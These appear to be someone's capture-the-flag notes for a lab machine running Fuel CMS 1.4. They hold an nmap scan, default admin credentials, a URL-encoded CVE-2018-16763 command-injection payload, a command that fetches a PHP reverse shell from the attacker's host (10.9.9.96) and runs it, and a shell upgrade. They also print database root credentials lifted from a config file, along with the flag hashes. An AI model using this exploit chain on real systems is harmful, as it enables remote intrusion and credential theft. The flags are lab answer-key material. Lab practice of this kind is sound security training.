export ip=10.10.28.46

```
User.txt
6470e394cbf6dab6a91682cc8585059b
```
```
Root.txt
b9bbcb33e11b80be759c4e844862482d
```

```
nmap scan

# Nmap 7.80 scan initiated Wed Jun 24 12:30:40 2020 as: nmap -sC -sV -oN nmap.txt 10.10.28.46
Nmap scan report for 10.10.28.46
Host is up (0.076s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 12:30:54 2020 -- 1 IP address (1 host up) scanned in 13.52 seconds

```

```
$ip/fuel
admin:admin

maybe could be solved by uploading reverse php shell via the cms control panel since we know the creds ...
```
```
Fuel CMS RCE < 1.4.1 (1.4 in our case)
CVE 2018-16763 

exploit(code='ls -la'):

$ip/fuel/pages/select/?filter='%2bpi(print(%24a%3d'system'))%2b%24a('ls -al')%2b'

credits: https://www.youtube.com/watch?v=wLWqkULvefU
```

```
reverse shell upload and execute

http://10.10.28.46/fuel/pages/select/?filter='%2bpi(print(%24a%3d'system'))%2b%24a('wget 10.9.9.96:8000/reverse.php -O reverse.php')%2b'

10.10.28.46/reverse.php

python -c 'import pty; pty.spawn("/bin/bash")'
```

```
$ cat /var/www/html/fuel/application/config/database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.                                                                                                                            
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching                                                                                                                                          
|       ['cachedir'] The path to the folder where cache files should be stored                                                                                                                            
|       ['char_set'] The character set used in communicating with the database                                                                                                                            
|       ['dbcollat'] The character collation used in communicating with the database                                                                                                                      
|                                NOTE: For MySQL and MySQLi databases, this setting is only used                                                                                                          
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7                                                                                                       
|                                (and in table creation queries made with DB Forge).                                                                                                                      
|                                There is an incompatibility in PHP with mysql_real_escape_string() which                                                                                                 
|                                can make your site vulnerable to SQL injection if you are using a                                                                                                        
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}

```

!!! FOUND the root cred at the fuel CMS DB config file (/var/www/html/fuel/application/config/database.php) !!!

```
'username' => 'root',
'password' => 'mememe',
```
